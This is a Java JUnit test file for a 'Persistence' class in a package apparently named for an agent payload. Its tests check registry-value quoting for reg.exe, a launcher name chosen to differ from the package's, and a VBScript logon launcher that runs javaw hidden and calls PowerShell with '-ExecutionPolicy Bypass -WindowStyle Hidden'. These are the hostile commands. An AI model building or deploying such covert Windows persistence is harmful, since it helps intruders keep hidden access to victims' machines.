package com.spcagentpayloa.jvmxx;

import org.junit.jupiter.api.Test;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

class PersistenceTest {
	private static final String COMMAND =
		"\"C:\\Windows\\System32\\wscript.exe\" //nologo \"C:\\Users\\John Doe\\startup.vbs\"";

	/** reg.exe re-parses its own command line: quotes must arrive backslash-escaped. */
	@Test
	void regValueEscapesQuotes() {
		assertEquals(
			"\\\"C:\\Windows\\System32\\wscript.exe\\\" //nologo \\\"C:\\Users\\John Doe\\startup.vbs\\\"",
			Persistence.regValue(COMMAND));
	}

	@Test
	void regValueLeavesUnquotedValuesAlone() {
		assertEquals("plain", Persistence.regValue("plain"));
	}

	@Test
	void launcherNameIsNotThePackageOne() {
		assertFalse(Persistence.launcher(java.nio.file.Path.of("C:\\x")).toString().isEmpty());
	}

	/** A quoting slip here makes the logon task exit 1 without a visible error. */
	@Test
	void launcherBuildsQuotesThroughChr32() {
		String script = Persistence.launcherScript(
			java.nio.file.Path.of("C:\\Users\\John Doe\\AppData\\Local\\Microsoft\\Java"),
			"\"C:\\spc\\jdk\\bin\\javaw.exe\"");
		assertTrue(script.contains("q = Chr(34)"));
		assertTrue(script.contains(
			"sh.Run q & exe & q & \" \" & heap & \" -jar \" & q & jar & q, 0, False"));
		assertTrue(script.contains(
			"powershell -NoP -ExecutionPolicy Bypass -WindowStyle Hidden -File \" & q & dir"));
		assertFalse(script.contains("\"\"\"\""));
	}
}
